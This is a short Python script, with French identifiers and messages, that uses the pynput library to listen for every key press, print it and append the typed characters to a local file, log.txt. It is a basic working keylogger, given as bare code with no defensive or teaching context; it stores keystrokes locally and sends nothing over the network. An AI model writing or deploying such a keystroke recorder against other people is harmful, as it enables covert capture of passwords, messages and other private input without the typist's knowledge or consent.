from pynput import keyboard


def Tappui(key):
    print(str(key))
    with open("log.txt",'a') as HiTouch:
        try:
            char = key.char
            HiTouch.write(char)
        except:
            print('Impossible de récupérer la touche')

if __name__ == '__main__':
    recup = keyboard.Listener(on_press=Tappui)
    recup.start()
    input()